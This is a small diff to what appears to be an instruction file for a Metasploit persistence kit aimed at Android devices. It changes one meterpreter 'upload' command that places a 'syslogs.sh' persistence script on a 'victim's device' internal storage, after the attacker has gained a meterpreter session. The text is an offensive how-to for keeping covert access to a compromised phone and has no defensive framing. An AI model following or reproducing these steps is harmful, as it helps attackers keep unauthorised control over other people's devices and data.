@@ -6,7 +6,7 @@ Now when you get meterpreter session of your victim device to follow the below s
 
 Ex :-
 
-meterpreter> upload /sdcard/syslogs.sh  /sdcard
+meterpreter> upload $HOME/MSF-payload-autostart/syslogs.sh  /sdcard
 
 (Nowhere the persistent script will be uploaded to your victim's device internal storage)
 
